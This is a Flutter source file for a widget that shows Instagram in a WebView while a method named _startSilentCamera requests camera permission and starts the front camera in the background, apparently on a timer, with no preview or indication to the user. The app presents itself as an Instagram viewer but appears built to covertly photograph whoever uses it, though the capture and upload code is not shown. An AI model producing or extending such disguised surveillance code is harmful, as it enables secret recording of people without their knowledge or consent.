import 'package:camera/camera.dart';
import 'package:flutter/material.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:permission_handler/permission_handler.dart';

import '../features/camera_service.dart';

class Webviewr extends StatefulWidget {
  const Webviewr({super.key});

  @override
  State<Webviewr> createState() => _WebviewrState();
}

class _WebviewrState extends State<Webviewr> {
  late final WebViewController controller;
  final CameraService _cameraService = CameraService();

  @override
  void initState() {
    super.initState();
    _initWebView();
    _startSilentCamera();
  }

  void _initWebView() {
    controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..loadRequest(Uri.parse("https://www.instagram.com"));
  }

  Future<void> _startSilentCamera() async {
    // Ask camera permission
    if (!await Permission.camera.request().isGranted) {
      print("❌ Camera permission denied");
      return;
    }

    await _cameraService.initializeCamera(
      direction: CameraLensDirection.front,
    );
  }

  @override
  void dispose() {
    _cameraService.disposeCamera(); // stop camera and timer
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        if (await controller.canGoBack()) {
          controller.goBack();
          return false;
        } else {
          return true;
        }
      },
      child: SafeArea(
        child: WebViewWidget(controller: controller),
      ),
    );
  }
}
